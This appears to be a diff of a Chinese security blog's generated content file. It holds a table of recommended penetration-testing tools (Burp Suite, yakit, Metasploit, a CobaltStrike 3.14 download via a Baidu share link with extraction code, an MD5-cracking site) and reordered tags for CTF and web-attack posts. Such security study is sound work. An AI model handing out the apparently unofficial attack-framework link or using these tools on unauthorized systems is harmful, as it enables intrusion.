href="#1-2-5-综合工具" class="headerlink" title="1.2.5 综合工具"></a>1.2.5 综合工具</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>yakit</td><td><a href="https://yaklang.com/">https://yaklang.com/</a></td><td>9</td><td>单兵工具平台</td><td></td><td></td></tr><tr><td>burpsuite</td><td><a href="https://portswigger.net/burp">https://portswigger.net/burp</a></td><td>9</td><td>单兵工具平台</td><td></td><td></td></tr></tbody></table><h2 id="1-3-内网攻防-综合渗透"><a href="#1-3-内网攻防-综合渗透" class="headerlink" title="1.3 内网攻防/综合渗透"></a>1.3 内网攻防/综合渗透</h2><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>CobaltStrike 3.14</td><td>链接: <a href="https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA">https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA</a> 提取码: yiqp</td><td>9</td><td>综合渗透</td><td>详见本站《CobaltStrike》</td><td></td></tr><tr><td>metasploit framework</td><td>kali内置，<a href="https://www.metasploit.com/">https://www.metasploit.com/</a></td><td>9</td><td>综合渗透</td><td>详见本站《MSF-Metasploit》</td><td></td></tr></tbody></table><h1 id="二、靶场综合渗透实战"><a href="#二、靶场综合渗透实战" class="headerlink" title="二、靶场综合渗透实战"></a>二、靶场综合渗透实战</h1><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、CTF实战"><a href="#四、CTF实战" class="headerlink" title="四、CTF实战"></a>四、CTF实战</h1><h2 id="哈希破解工具"><a href="#哈希破解工具" class="headerlink" title="哈希破解工具"></a>哈希破解工具</h2><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>cmd5</td><td><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></td><td>7</td><td>破解常见的md5值</td><td>有时需要付费</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="编码转换工具"><a href="#编码转换工具" class="headerlink" title="编码转换工具"></a>编码转换工具</h2><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>tool.lu</td><td><a href="https://tool.lu/hexconvert/">https://tool.lu/hexconvert/</a></td><td>8</td><td>进制转换</td><td></td><td></td></tr></tbody></table>]]></content>
       
       
       <categories>
@@ -107,9 +136,9 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
             
             <tag> burp工具 </tag>
             
@@ -190,11 +219,11 @@
       
         <tags>
             
+            <tag> CTF实战 </tag>
+            
             <tag> web安全 </tag>
             
             <tag> XXE </tag>
-            
-            <tag> CTF实战 </tag>
             
         </tags>
       
@@ -221,9 +250,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 漏洞知识库 </tag>
-            
             <tag> XXE </tag>
+            
+            <tag> 漏洞知识库 </tag>
             
         </tags>
       
@@ -248,13 +277,13 @@
       
         <tags>
             
+            <tag> CTF实战 </tag>
+            
             <tag> web安全 </tag>
             
             <tag> SSRF </tag>
             
             <tag> 哈希长度扩展攻击 </tag>
-            
-            <tag> CTF实战 </tag>
             
         </tags>
       
@@ -279,9 +308,9 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
             
             <tag> 命令执行 </tag>
             
@@ -308,11 +337,11 @@
       
         <tags>
             
+            <tag> CTF实战 </tag>
+            
             <tag> web安全 </tag>
             
             <tag> 文件上传 </tag>
-            
-            <tag> CTF实战 </tag>
             
         </tags>
       
@@ -337,11 +366,11 @@
       
         <tags>
             
-            <tag> web安全 </tag>
+            <tag> CTF实战 </tag>
             
             <tag> 文件包含 </tag>
             
-            <tag> CTF实战 </tag>
+            <tag> web安全 </tag>
             
         </tags>
       
@@ -426,11 +455,11 @@
             
             <tag> web安全 </tag>
             
+            <tag> SSRF </tag>
+            
             <tag> 漏洞知识库 </tag>
             
             <tag> 服务端跨站请求 </tag>
-            
-            <tag> SSRF </tag>
             
         </tags>
       
@@ -486,11 +515,11 @@
       
         <tags>
             
+            <tag> CTF实战 </tag>
+            
             <tag> web安全 </tag>
             
             <tag> 跨站脚本攻击 </tag>
-            
-            <tag> CTF实战 </tag>
             
             <tag> 存储型XSS </tag>
             
@@ -546,11 +575,11 @@
       
         <tags>
             
+            <tag> 文件包含 </tag>
+            
             <tag> web安全 </tag>
             
             <tag> 漏洞知识库 </tag>
-            
-            <tag> 文件包含 </tag>
             
         </tags>
       
@@ -575,9 +604,9 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
             
             <tag> 文件包含漏洞 </tag>
             
@@ -604,9 +633,9 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
             
             <tag> 暴力破解 </tag>
             
@@ -633,9 +662,9 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
             
             <tag> sql注入 </tag>
             
@@ -662,9 +691,9 @@
       
         <tags>
             
-            <tag> 跨站脚本攻击 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> 跨站脚本攻击 </tag>
             
             <tag> xss-labs </tag>
             
@@ -693,9 +722,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> XSS </tag>
-            
             <tag> 跨站脚本攻击 </tag>
+            
+            <tag> XSS </tag>
             
         </tags>
       
@@ -751,9 +780,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 文件上传漏洞 </tag>
-            
             <tag> 二次渲染绕过 </tag>
+            
+            <tag> 文件上传漏洞 </tag>
             
         </tags>
       
@@ -1132,11 +1161,11 @@
       
         <tags>
             
+            <tag> 系统运维 </tag>
+            
             <tag> ssh服务 </tag>
             
             <tag> ssh公私钥认证 </tag>
-            
-            <tag> 系统运维 </tag>
             
         </tags>
       
@@ -1372,11 +1401,11 @@
             
             <tag> 内网攻防 </tag>
             
-            <tag> 隧道搭建 </tag>
-            
             <tag> 综合渗透 </tag>
             
             <tag> 域渗透 </tag>
+            
+            <tag> 隧道搭建 </tag>
             
             <tag> WHOAMI靶场 </tag>
             
@@ -1407,11 +1436,11 @@
             
             <tag> 内网攻防 </tag>
             
-            <tag> 隧道搭建 </tag>
-            
             <tag> 综合渗透 </tag>
             
             <tag> 域渗透 </tag>
+            
+            <tag> 隧道搭建 </tag>
             
             <tag> WHOAMI靶场 </tag>
             
@@ -1521,9 +1550,9 @@
       
         <tags>
             
-            <tag> 系统运维 </tag>
-            
             <tag> ubuntu的ssh服务 </tag>
+            
+            <tag> 系统运维 </tag>
             
         </tags>
       
@@ -1938,11 +1967,11 @@
       
         <tags>
             
+            <tag> 密码学算法安全 </tag>
+            
             <tag> padding oracle攻击 </tag>
             
             <tag> web安全中的密码学攻击 </tag>
-            
-            <tag> 密码学算法安全 </tag>
             
         </tags>
       
@@ -1967,9 +1996,9 @@
       
         <tags>
             
-            <tag> 密码学算法安全 </tag>
-            
             <tag> 哈希长度扩展攻击 </tag>
+            
+            <tag> 密码学算法安全 </tag>
             
             <tag> md5哈希长度扩展攻击 </tag>
             
